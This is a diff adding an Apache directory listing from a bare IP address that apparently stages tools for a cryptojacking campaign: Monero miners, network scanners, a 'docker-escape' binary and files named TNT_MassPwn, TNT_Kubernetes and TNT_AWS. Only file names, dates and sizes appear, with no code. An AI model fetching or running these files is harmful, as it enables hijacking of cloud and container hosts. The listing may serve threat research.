@@ -1,0 +1,35 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
+<html>
+ <head>
+  <title>Index of /chimaera/bin/64bit</title>
+ </head>
+ <body>
+<h1>Index of /chimaera/bin/64bit</h1>
+  <table>
+   <tr><th valign="top"><img src="/icons/blank.gif" alt="[ICO]"></th><th><a href="?C=N;O=A">Name</a></th><th><a href="?C=M;O=A">Last modified</a></th><th><a href="?C=S;O=A">Size</a></th><th><a href="?C=D;O=A">Description</a></th></tr>
+   <tr><th colspan="5"><hr></th></tr>
+<tr><td valign="top"><img src="/icons/back.gif" alt="[PARENTDIR]"></td><td><a href="/chimaera/bin/">Parent Directory</a></td><td>&nbsp;</td><td align="right">  - </td><td>&nbsp;</td></tr>
+<tr><td valign="top"><img src="/icons/unknown.gif" alt="[   ]"></td><td><a href="zmap">zmap</a></td><td align="right">2021-02-21 21:11  </td><td align="right">235K</td><td>&nbsp;</td></tr>
+<tr><td valign="top"><img src="/icons/unknown.gif" alt="[   ]"></td><td><a href="zgrab">zgrab</a></td><td align="right">2021-02-21 21:07  </td><td align="right">2.0M</td><td>&nbsp;</td></tr>
+<tr><td valign="top"><img src="/icons/unknown.gif" alt="[   ]"></td><td><a href="xmrig_ps_e">xmrig_ps_e</a></td><td align="right">2021-02-22 21:55  </td><td align="right">6.7M</td><td>&nbsp;</td></tr>
+<tr><td valign="top"><img src="/icons/compressed.gif" alt="[   ]"></td><td><a href="xmrig-6.8.1-linux-static-x64.tar.gz">xmrig-6.8.1-linux-static-x64.tar.gz</a></td><td align="right">2021-02-03 00:56  </td><td align="right">2.4M</td><td>&nbsp;</td></tr>
+<tr><td valign="top"><img src="/icons/unknown.gif" alt="[   ]"></td><td><a href="xmrig">xmrig</a></td><td align="right">2021-02-23 20:19  </td><td align="right">2.1M</td><td>&nbsp;</td></tr>
+<tr><td valign="top"><img src="/icons/unknown.gif" alt="[   ]"></td><td><a href="xmr.xz">xmr.xz</a></td><td align="right">2021-02-22 16:06  </td><td align="right">2.0M</td><td>&nbsp;</td></tr>
+<tr><td valign="top"><img src="/icons/unknown.gif" alt="[   ]"></td><td><a href="xmr">xmr</a></td><td align="right">2021-02-22 16:06  </td><td align="right">2.1M</td><td>&nbsp;</td></tr>
+<tr><td valign="top"><img src="/icons/compressed.gif" alt="[   ]"></td><td><a href="wget.rpm.tar.gz">wget.rpm.tar.gz</a></td><td align="right">2021-02-22 16:16  </td><td align="right">532K</td><td>&nbsp;</td></tr>
+<tr><td valign="top"><img src="/icons/unknown.gif" alt="[   ]"></td><td><a href="wget.rpm">wget.rpm</a></td><td align="right">2019-05-16 15:48  </td><td align="right">547K</td><td>&nbsp;</td></tr>
+<tr><td valign="top"><img src="/icons/unknown.gif" alt="[   ]"></td><td><a href="pei">pei</a></td><td align="right">2021-02-02 01:14  </td><td align="right"> 46M</td><td>&nbsp;</td></tr>
+<tr><td valign="top"><img src="/icons/unknown.gif" alt="[   ]"></td><td><a href="jq">jq</a></td><td align="right">2021-02-04 08:03  </td><td align="right">3.8M</td><td>&nbsp;</td></tr>
+<tr><td valign="top"><img src="/icons/unknown.gif" alt="[   ]"></td><td><a href="hawkeye">hawkeye</a></td><td align="right">2021-02-22 23:57  </td><td align="right">2.9M</td><td>&nbsp;</td></tr>
+<tr><td valign="top"><img src="/icons/unknown.gif" alt="[   ]"></td><td><a href="docker-escape">docker-escape</a></td><td align="right">2020-12-20 00:20  </td><td align="right"> 16M</td><td>&nbsp;</td></tr>
+<tr><td valign="top"><img src="/icons/unknown.gif" alt="[   ]"></td><td><a href="curl">curl</a></td><td align="right">2019-01-07 19:50  </td><td align="right">2.7M</td><td>&nbsp;</td></tr>
+<tr><td valign="top"><img src="/icons/unknown.gif" alt="[   ]"></td><td><a href="bob">bob</a></td><td align="right">2020-07-30 14:53  </td><td align="right"> 13M</td><td>&nbsp;</td></tr>
+<tr><td valign="top"><img src="/icons/unknown.gif" alt="[   ]"></td><td><a href="aws_zig">aws_zig</a></td><td align="right">2021-02-22 05:44  </td><td align="right">931K</td><td>&nbsp;</td></tr>
+<tr><td valign="top"><img src="/icons/unknown.gif" alt="[   ]"></td><td><a href="TNT_MassPwn">TNT_MassPwn</a></td><td align="right">2021-02-13 02:24  </td><td align="right">931K</td><td>&nbsp;</td></tr>
+<tr><td valign="top"><img src="/icons/unknown.gif" alt="[   ]"></td><td><a href="TNT_Kubernetes_e_u">TNT_Kubernetes_e_u</a></td><td align="right">2021-02-22 22:34  </td><td align="right">2.2M</td><td>&nbsp;</td></tr>
+<tr><td valign="top"><img src="/icons/unknown.gif" alt="[   ]"></td><td><a href="TNT_AWS">TNT_AWS</a></td><td align="right">2021-02-12 23:48  </td><td align="right">931K</td><td>&nbsp;</td></tr>
+<tr><td valign="top"><img src="/icons/unknown.gif" alt="[   ]"></td><td><a href="AWS">AWS</a></td><td align="right">2021-02-26 02:38  </td><td align="right">931K</td><td>&nbsp;</td></tr>
+   <tr><th colspan="5"><hr></th></tr>
+</table>
+<address>Apache/2.4.29 (Ubuntu) Server at 45.9.148.85 Port 80</address>
+</body></html>
